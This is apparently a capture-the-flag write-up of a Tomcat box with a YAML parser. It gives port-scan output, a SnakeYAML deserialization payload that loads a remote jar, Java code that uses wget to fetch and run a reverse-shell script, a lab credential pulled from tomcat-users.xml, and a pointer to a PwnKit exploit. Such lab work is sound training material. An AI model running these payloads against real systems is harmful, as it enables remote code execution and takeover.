### Port scan
```text
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpzM/GEYunOwIMB+FyQCnOaYRK1DYv8e0+VI3Zy7LnY157q+3SITcgm98JGS/gXgdHQ4JnkCcXjUb9LaNRxRWO+l43E9v2b2U9roG8QetbBUl5CjJ0KHXeIwNgOcsqfwju8i8GA8sqQCELpJ3zKtKtxeoBo+/o3OnKGzT/Ou8lqPK7ESeh6OWCo15Rx9iOBS40i6zk77QTc4h2jGLOgyTfOuSGTWhUxkhqBLqSaHz80G7HsPSs1BA9zAV8BOx9WmtpMsgDcNG14JAQQd904RCzgw0OaQ0J6szs78Us8Piec0rF/T4b1H3sbUedOdA0QKgGbNojObVrz5VwOw6rqxbs1gZLePXB5ZNjm0cp+Sen8TkRkdUf7Sgw92B//RhSoIakp1u5eOPs/uJ6hyCholUnerl3WK8NPB9f9ICPYq8PbvVMu6zcytV/cCjwxFloWB989iyuqG/lYcdMhGJlAacOFy5TRcTB8c5Qlmtl44J/4dyuCJAhj5SY6TRdcSxhmz0=
|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM79V2Ts2us0NxZA7nnN9jor98XRj0hw7QCb+A9U8aEhoYBcrtUqegExaj/yrxjbZ/l0DWw2EkqH4uly451JuMs=
|   256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO31s/C33kbuzZl9ohJWVEmLsW9aqObU6ZjlpbOQJt0C
8080/tcp open  http    syn-ack Apache Tomcat 9.0.38
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Parse YAML
```

### Web Enum
```bash
# dir enum
/index.jsp   -> yaml parse page
host-manager -> tomcat auth
manager      -> tomcat auth  
Servlet      -> blank
test         -> nth  
```

### Exploitation
```bash
# yaml parse can lead RCE, get traffic back from the target by entering payload
!!javax.script.ScriptEngineManager [  
  !!java.net.URLClassLoader [[  
    !!java.net.URL ["http://attacker-ip/"]  
  ]]  
]

# found payload that can cause RCE
https://github.com/artsploit/yaml-payload.git

# modify function and compile the payload to binary
public AwesomeScriptEngineFactory() throws InterruptedException {
        try {
            Process p = Runtime.getRuntime().exec("wget http://10.10.14.20:8888/shell.sh -O /dev/shm/shell.sh");
            p.waitFor();
            p = Runtime.getRuntime().exec("chmod +x /dev/shm/shell.sh");
            p.waitFor();
            p = Runtime.getRuntime().exec("/dev/shm/shell.sh");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

# trigger reverse shell by sending yaml payload
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.20:8888/yaml-payload/yaml-payload.jar"]
  ]]
```

### Priv Esc
```bash
# found user cred on /opt/tomcat/conf/tomcat-users.xml
<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>

# switch to user (admin)
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" admin@$IP

# found CVE vuln
link: https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c
CVE-2021-4034
```
